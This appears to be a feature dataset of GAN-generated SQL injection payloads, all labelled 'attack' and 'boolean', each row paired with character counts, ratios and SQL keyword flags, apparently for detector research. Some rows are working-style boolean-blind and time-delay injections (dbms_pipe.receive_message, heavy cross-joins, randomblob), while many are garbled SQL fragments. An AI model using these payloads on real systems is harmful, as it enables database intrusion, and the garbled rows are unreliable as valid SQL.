label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1""  )   where 2072  =  1 or 2367  =    (  select cont  (  3814  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,469,68.0,23.0,3.4529612035269572,17.0,14.0,29.0,8.0,0.25,0.20588235294117646,0.4264705882352941,0.11764705882352941,0.0,2.0,0.0,0.0,0.0,3.0,0.0,3.0,0.0,0.0,0.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,470,107.0,27.0,3.5228911686215136,34.0,13.0,46.0,14.0,0.3177570093457944,0.12149532710280374,0.42990654205607476,0.1308411214953271,4.0,0.0,0.0,0.0,0.0,2.0,0.0,6.0,2.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,1%'  )   and 3202  =  like  (  'abcdevecec' like 'atap_set  (  chrdeftgexs_bles alles(ipe_lsis s as gt  (  \d  (  *  )   or domas iozableserie_messustag,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,471,152.0,35.0,4.1928037127247375,89.0,5.0,39.0,19.0,0.5855263157894737,0.03289473684210526,0.2565789473684211,0.125,4.0,0.0,0.0,0.0,1.0,1.0,0.0,7.0,1.0,4.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%'  )   and 3202  =  like  (  'abcdexp_xms s as t2,sysssibm.systables ast_s_lllegl_users sg)    (     )   and'  =  ')    (  select cont  (  *  and   all_users tomains as t3  )  #",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,472,179.0,34.0,3.9631179618143575,89.0,7.0,58.0,25.0,0.4972067039106145,0.03910614525139665,0.3240223463687151,0.13966480446927373,4.0,0.0,0.0,0.0,1.0,2.0,0.0,9.0,1.0,5.0,1.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%'  )   and 3202  =  like  (  'abmes    (  select conies t2,aive_ses uses(  *  )   or 8312  =  5127  )   and    )      ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,473,120.0,32.0,3.6696115587232674,41.0,14.0,50.0,15.0,0.3416666666666667,0.11666666666666667,0.4166666666666667,0.125,2.0,0.0,0.0,0.0,1.0,2.0,0.0,7.0,1.0,1.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%'  )   and 3202  =  like  (  'abcdomains as t2,all_userdobsers as all_users all_users ssipipe.receive_mes s as t3  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,474,122.0,31.0,4.177709834577943,73.0,7.0,27.0,15.0,0.5983606557377049,0.05737704918032787,0.22131147540983606,0.12295081967213115,2.0,0.0,2.0,0.0,0.0,1.0,0.0,3.0,1.0,4.0,1.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1%avh  ""  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,475,16.0,9.0,2.646782221599798,3.0,1.0,7.0,5.0,0.1875,0.0625,0.4375,0.3125,0.0,1.0,2.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1%5672 7417  7272 and 3018  (  66  )   from 8407  =    (  select count  (  *  )   and    (    (   5888'   ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,476,106.0,29.0,3.531559303707507,21.0,27.0,47.0,11.0,0.19811320754716982,0.25471698113207547,0.44339622641509435,0.10377358490566038,1.0,0.0,0.0,0.0,1.0,1.0,0.0,7.0,1.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,477,141.0,31.0,3.99437988629496,68.0,8.0,45.0,20.0,0.48226950354609927,0.05673758865248227,0.3191489361702128,0.14184397163120568,2.0,2.0,0.0,0.0,1.0,2.0,0.0,6.0,2.0,0.0,2.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,1 where 9782  =  *  )   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,478,26.0,14.0,3.082987879486851,5.0,5.0,11.0,5.0,0.19230769230769232,0.19230769230769232,0.4230769230769231,0.19230769230769232,0.0,0.0,2.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1%'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,479,116.0,30.0,3.604159432376662,35.0,13.0,49.0,19.0,0.3017241379310345,0.11206896551724138,0.4224137931034483,0.16379310344827586,4.0,0.0,0.0,0.0,1.0,2.0,0.0,8.0,2.0,1.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,480,134.0,28.0,4.017109138141297,66.0,10.0,36.0,22.0,0.4925373134328358,0.07462686567164178,0.26865671641791045,0.16417910447761194,0.0,4.0,0.0,0.0,1.0,2.0,0.0,4.0,2.0,5.0,4.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,481,141.0,30.0,3.966011091968719,68.0,8.0,45.0,20.0,0.48226950354609927,0.05673758865248227,0.3191489361702128,0.14184397163120568,4.0,0.0,0.0,0.0,1.0,2.0,0.0,6.0,2.0,0.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1"" or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""x  )   aypp",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,482,135.0,31.0,4.053908941947162,70.0,10.0,37.0,18.0,0.5185185185185185,0.07407407407407407,0.2740740740740741,0.13333333333333333,0.0,2.0,0.0,0.0,1.0,1.0,0.0,5.0,0.0,5.0,4.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""hw    )   )    )      )    (   ""  )   or 1022  =    (  select count  (  *  rs all_users s_blll_userds as t2,cdel_usetas all_users dbcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ',9432  )   and    (    (    and    (     (  ""%""i   ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,483,388.0,39.0,3.642988631970993,127.0,34.0,172.0,55.0,0.327319587628866,0.08762886597938144,0.44329896907216493,0.14175257731958762,4.0,5.0,0.0,2.0,1.0,2.0,0.0,31.0,1.0,5.0,4.0,5.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,5.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1%' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,484,133.0,29.0,4.02849050309211,65.0,10.0,36.0,22.0,0.48872180451127817,0.07518796992481203,0.2706766917293233,0.16541353383458646,4.0,0.0,0.0,0.0,1.0,2.0,0.0,4.0,2.0,5.0,4.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,485,92.0,22.0,3.014506656744198,13.0,13.0,48.0,18.0,0.14130434782608695,0.14130434782608695,0.5217391304347826,0.1956521739130435,4.0,0.0,0.0,0.0,0.0,2.0,0.0,8.0,2.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  ""sys'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,486,152.0,34.0,3.4663286638769075,38.0,15.0,72.0,27.0,0.25,0.09868421052631579,0.47368421052631576,0.17763157894736842,4.0,4.0,0.0,1.0,0.0,3.0,0.0,12.0,2.0,0.0,1.0,4.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,487,134.0,28.0,4.017109138141297,66.0,10.0,36.0,22.0,0.4925373134328358,0.07462686567164178,0.26865671641791045,0.16417910447761194,0.0,4.0,0.0,0.0,1.0,2.0,0.0,4.0,2.0,5.0,4.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1'   )    )      )    )     )   where   (  ""%""  =  "" ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,488,53.0,12.0,1.9941575570221786,5.0,1.0,35.0,12.0,0.09433962264150944,0.018867924528301886,0.660377358490566,0.22641509433962265,1.0,3.0,0.0,0.0,0.0,1.0,0.0,6.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"select count  (  r  (  select count  (  chr  (  'abcdefg',t  (  hex  (  3702  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,489,84.0,26.0,3.657566814333394,37.0,4.0,31.0,12.0,0.44047619047619047,0.047619047619047616,0.36904761904761907,0.14285714285714285,2.0,0.0,2.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,1.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,select   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,490,11.0,7.0,2.6635327548042547,6.0,0.0,3.0,2.0,0.5454545454545454,0.0,0.2727272727272727,0.18181818181818182,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1%""  )   and elt  (  7436  =  9874,9874  )   and   (  ""%"" or make_set  (  9354  =  9354,7185  )   and """"  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,491,110.0,27.0,3.6711015842676047,21.0,25.0,44.0,20.0,0.19090909090909092,0.22727272727272727,0.4,0.18181818181818182,0.0,6.0,0.0,0.0,0.0,3.0,0.0,6.0,2.0,1.0,2.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1""   )  ||1  )   or 9643  =    (  chr  (  select 1  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,492,57.0,20.0,3.094017859393867,11.0,7.0,28.0,11.0,0.19298245614035087,0.12280701754385964,0.49122807017543857,0.19298245614035087,0.0,1.0,2.0,0.0,0.0,1.0,0.0,5.0,0.0,0.0,0.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,493,57.0,25.0,3.8119523053943785,12.0,13.0,20.0,12.0,0.21052631578947367,0.22807017543859648,0.3508771929824561,0.21052631578947367,0.0,4.0,0.0,0.0,0.0,2.0,0.0,2.0,2.0,1.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,494,133.0,29.0,4.02849050309211,65.0,10.0,36.0,22.0,0.48872180451127817,0.07518796992481203,0.2706766917293233,0.16541353383458646,4.0,0.0,0.0,0.0,1.0,2.0,0.0,4.0,2.0,5.0,4.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,495,138.0,30.0,4.033493657696427,75.0,8.0,37.0,18.0,0.5434782608695652,0.057971014492753624,0.26811594202898553,0.13043478260869565,4.0,0.0,0.0,0.0,1.0,2.0,0.0,4.0,2.0,0.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'w'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'vejtakveapeape_pppt  (  87  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,496,242.0,39.0,3.8650687793781127,71.0,30.0,100.0,41.0,0.29338842975206614,0.12396694214876033,0.4132231404958678,0.16942148760330578,4.0,0.0,2.0,0.0,0.0,2.0,0.0,20.0,0.0,4.0,2.0,10.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1'   )    )    as rs ' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,497,169.0,33.0,3.6946378984258295,45.0,24.0,71.0,29.0,0.26627218934911245,0.14201183431952663,0.42011834319526625,0.17159763313609466,3.0,0.0,0.0,0.0,0.0,2.0,0.0,13.0,0.0,2.0,1.0,9.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,498,107.0,27.0,3.5228911686215136,34.0,13.0,46.0,14.0,0.3177570093457944,0.12149532710280374,0.42990654205607476,0.1308411214953271,4.0,0.0,0.0,0.0,0.0,2.0,0.0,6.0,2.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%a'  =  'vivners akepecepr_s_gs sbtables as rs iot  (  mbceiveeas astablupes 9169,rdbloms as t2,systrie_s(  500000000  (    (   5888  =  5173 and 3707  =    (  select count  (  *  )   or ""%""  =  -- whereugundbs as t3,alell_",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,499,224.0,41.0,4.406573565131161,109.0,28.0,60.0,27.0,0.48660714285714285,0.125,0.26785714285714285,0.12053571428571429,2.0,2.0,2.0,0.0,1.0,4.0,0.0,7.0,2.0,4.0,3.0,7.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,500,92.0,22.0,3.014506656744198,13.0,13.0,48.0,18.0,0.14130434782608695,0.14130434782608695,0.5217391304347826,0.1956521739130435,4.0,0.0,0.0,0.0,0.0,2.0,0.0,8.0,2.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
